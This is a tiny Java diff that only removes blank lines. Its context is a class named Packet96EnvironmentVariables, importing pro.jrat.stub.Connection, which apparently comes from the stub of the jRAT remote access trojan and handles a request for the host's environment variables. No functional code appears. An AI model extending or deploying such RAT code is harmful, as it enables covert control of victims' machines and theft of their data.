@@ -4,8 +4,6 @@ import java.util.Set;
 
 import pro.jrat.stub.Connection;
 
-
-
 public class Packet96EnvironmentVariables extends AbstractIncomingPacket {
 
 	@Override
